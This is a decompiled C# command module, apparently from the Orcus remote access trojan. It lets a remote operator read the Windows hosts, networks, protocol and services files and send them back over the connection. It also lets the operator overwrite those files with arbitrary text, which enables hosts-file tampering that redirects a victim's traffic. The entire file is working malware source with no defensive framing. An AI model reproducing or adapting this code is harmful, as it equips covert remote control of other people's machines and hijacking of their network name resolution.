using System;
using System.IO;
using System.Text;
using Orcus.Plugins;
using Orcus.Shared.Commands.WindowsDrivers;

namespace Orcus.Commands.WindowsDrivers;

public class WindowsDriversCommand : Command
{
	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_001a: Expected I4, but got Unknown
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		WindowsDriversCommunication val = (WindowsDriversCommunication)parameter[0];
		switch ((int)val)
		{
		case 0:
		{
			WindowsDriversFile windowsDriversFile2 = (WindowsDriversFile)parameter[1];
			SendDriverFile(windowsDriversFile2, connectionInfo);
			break;
		}
		case 1:
		{
			foreach (WindowsDriversFile value in Enum.GetValues(typeof(WindowsDriversFile)))
			{
				SendDriverFile(value, connectionInfo);
			}
			break;
		}
		default:
			throw new ArgumentOutOfRangeException();
		case 3:
			try
			{
				string driversFilePath = GetDriversFilePath((WindowsDriversFile)parameter[1]);
				string @string = Encoding.UTF8.GetString(parameter, 2, parameter.Length - 2);
				File.WriteAllText(driversFilePath, @string, Encoding.UTF8);
				((Command)this).ResponseByte((byte)4, connectionInfo);
				break;
			}
			catch (Exception ex)
			{
				((Command)this).ResponseBytes((byte)5, Encoding.UTF8.GetBytes(ex.Message), connectionInfo);
				break;
			}
		}
	}

	private string GetDriversFilePath(WindowsDriversFile windowsDriversFile)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected I4, but got Unknown
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		return Path.Combine(path2: "drivers\\etc\\" + (int)windowsDriversFile switch
		{
			0 => "hosts", 
			1 => "networks", 
			2 => "protocol", 
			3 => "services", 
			_ => throw new ArgumentOutOfRangeException("windowsDriversFile", windowsDriversFile, null), 
		}, path1: Environment.GetFolderPath(Environment.SpecialFolder.System));
	}

	private void SendDriverFile(WindowsDriversFile windowsDriversFile, IConnectionInfo connectionInfo)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Unknown result type (might be due to invalid IL or missing references)
		string s = ReadDriversFile(windowsDriversFile);
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		byte[] array = new byte[bytes.Length + 2];
		array[0] = 2;
		array[1] = (byte)windowsDriversFile;
		Buffer.BlockCopy(bytes, 0, array, 2, bytes.Length);
		connectionInfo.CommandResponse((Command)(object)this, array, (PackageCompression)0);
	}

	private string ReadDriversFile(WindowsDriversFile windowsDriversFile)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		FileInfo fileInfo = new FileInfo(GetDriversFilePath(windowsDriversFile));
		if (!fileInfo.Exists)
		{
			return $"# FILE NOT FOUND: {fileInfo.FullName}\r\n#Saving will result in creating the file";
		}
		using FileStream stream = new FileStream(fileInfo.FullName, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
		using StreamReader streamReader = new StreamReader(stream);
		return streamReader.ReadToEnd();
	}

	protected override uint GetId()
	{
		return 9u;
	}
}
